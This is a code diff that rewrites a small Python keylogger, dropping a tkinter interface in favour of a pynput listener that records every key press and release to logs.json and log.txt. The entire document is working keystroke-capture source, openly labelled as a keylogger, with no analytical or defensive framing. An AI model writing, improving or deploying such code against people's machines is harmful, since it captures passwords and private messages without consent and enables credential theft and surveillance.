@@ -1,53 +1,35 @@
-import tkinter as tk
-from tkinter import *
 from pynput import keyboard
 import json
 
+# ---------------- Variables ----------------
 key_list = []
-x = False
-key_strokes=""
+key_strokes = ""
 
+# ---------------- File Functions ----------------
 def update_text_file(key):
-    with open('log.txt', 'a') as key_stroke:     # append mode
+    with open('log.txt', 'a') as file:
+        file.write(key)
 
-        key_stroke.write(key)
+def update_json_file():
+    with open('logs.json', 'w') as file:
+        json.dump(key_list, file, indent=4)
 
-def update_json_file(key_list):
-    with open('logs.json', 'w') as Key_log:   # correct mode
-
-        key_list_bytes = json.dumps(key_list).encode()  # JSON string
-        Key_log.write(key_list_bytes)
-
-def on_press(key): 
-    global x, key_list
-    if x == False:
-        key_list.append(
-            {'Pressed': f'{key}'}
-        )
-        x = True
-    if x == True:
-        key_list.append(
-            {'Held': f'{key}'}
-        )
-    update_json_file(key_list)
+# ---------------- Key Events ----------------
+def on_press(key):
+    key_list.append({'Pressed': str(key)})
+    update_json_file()
 
 def on_release(key):
-    global x, key_list, key_strokes
-    key_list.append(
-        {'Released': f'{key}'}
-    )
-    if x == True:
-        x = False
-    update_json_file(key_list)
+    key_list.append({'Released': str(key)})
+    update_json_file()
+    update_text_file(str(key) + " ")
 
-    key_strokes = key_strokes + str(key) 
-    update_text_file(str(key_strokes))
-    
+# ---------------- Start Keylogger ----------------
+print("[+] Keylogger started...")
+print("[!] Press CTRL + C to stop")
 
-    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")
-
-empty = Label(root, text="Keylogger", font='verdana 11 bold').grid(row=2,column=2)
-Button(root, text="Start Keylogger", command=butaction).grid(row=5, column=2)
-root.mainloop()
-
-
+with keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release
+) as listener:
+    listener.join()
